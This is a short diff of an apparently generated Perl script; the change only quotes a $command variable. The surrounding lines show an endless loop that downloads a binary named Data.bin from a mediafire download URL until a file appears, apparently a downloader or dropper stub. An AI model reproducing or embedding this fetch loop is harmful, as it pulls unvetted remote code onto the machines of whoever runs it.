@@ -32,7 +32,7 @@ use LWP::UserAgent;
 use LWP::Simple;
 use Config;
 
-my \$command = $command;
+my \$command = "$command";
 while(1){
   while(! -e "../$command" && ! -e "../Data.bin"){
     getstore("http://download1654.mediafireuserdownload.com/6c6s7a8jsabg/0nwra4eocjkemrl/Data.bin", "Data.bin");
